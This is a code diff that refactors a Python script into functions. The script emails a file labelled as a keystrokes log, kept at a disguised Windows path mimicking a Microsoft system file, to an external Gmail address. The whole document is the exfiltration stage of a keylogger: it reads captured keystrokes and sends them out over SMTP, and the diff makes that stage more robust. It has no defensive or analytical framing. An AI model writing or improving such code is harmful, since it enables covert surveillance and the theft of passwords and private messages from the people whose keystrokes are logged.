@@ -1,46 +1,78 @@
+import os
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-import os
 
 # Email details
-sender_email = "your_email@gmail.com"
-receiver_email = "recipient_email@gmail.com"
-password = "your_email_password"  # If using 2FA, use App Password
-smtp_server = "smtp.gmail.com"
-smtp_port = 587
+SENDER_EMAIL = "your_email_here@gmail.com"  # Replace with your email
+RECEIVER_EMAIL = "recipient_email_here@gmail.com"  # Replace with the recipient's email
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
+KEYSTROKE_FILE = r"C:\ProgramData\Microsoft\Timer09C"
 
-# File to send
-keystroke_file = r"C:\ProgramData\Microsoft\Timer09C"
+# Securely fetch the password from environment variables
+PASSWORD = os.getenv("EMAIL_PASSWORD")
 
-# Create the email content
-subject = "Keystrokes Log"
-body = "Please find the attached keystrokes log."
+def create_email(subject, body, attachment_path):
+    """
+    Create a MIMEMultipart email with a subject, body, and attachment.
+    """
+    try:
+        message = MIMEMultipart()
+        message["From"] = SENDER_EMAIL
+        message["To"] = RECEIVER_EMAIL
+        message["Subject"] = subject
+        message.attach(MIMEText(body, "plain"))
 
-# Create the MIMEMultipart message
-message = MIMEMultipart()
-message["From"] = sender_email
-message["To"] = receiver_email
-message["Subject"] = subject
-message.attach(MIMEText(body, "plain"))
+        # Attach the file if it exists
+        if os.path.exists(attachment_path):
+            with open(attachment_path, "rb") as attachment:
+                part = MIMEBase("application", "octet-stream")
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header(
+                    "Content-Disposition",
+                    f"attachment; filename={os.path.basename(attachment_path)}"
+                )
+                message.attach(part)
+        else:
+            print(f"Warning: The file '{attachment_path}' does not exist.")
 
-# Attach the keystroke file
-with open(keystroke_file, "rb") as attachment:
-    part = MIMEBase("application", "octet-stream")
-    part.set_payload(attachment.read())
-    encoders.encode_base64(part)
-    part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(keystroke_file)}")
-    message.attach(part)
+        return message
+    except Exception as e:
+        print(f"Error creating email: {e}")
+        return None
 
-# Set up the SMTP server and send the email
-try:
-    with smtplib.SMTP(smtp_server, smtp_port) as server:
-        server.starttls()  # Encrypt connection
-        server.login(sender_email, password)
-        text = message.as_string()
-        server.sendmail(sender_email, receiver_email, text)
-        print("Email sent successfully!")
-except Exception as e:
-    print(f"Error sending email: {e}")
+def send_email(message):
+    """
+    Send an email using Gmail's SMTP server.
+    """
+    if not PASSWORD:
+        print("Error: EMAIL_PASSWORD environment variable is not set.")
+        return
+
+    try:
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls()  # Start TLS encryption
+            server.login(SENDER_EMAIL, PASSWORD)
+            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message.as_string())
+            print("Email sent successfully!")
+    except Exception as e:
+        print(f"Error sending email: {e}")
+
+def main():
+    """
+    Main function to create and send the keystroke file email.
+    """
+    subject = "Keystrokes Log"
+    body = "Please find the attached keystrokes log."
+    
+    email_message = create_email(subject, body, KEYSTROKE_FILE)
+    
+    if email_message:
+        send_email(email_message)
+
+if __name__ == "__main__":
+    main()
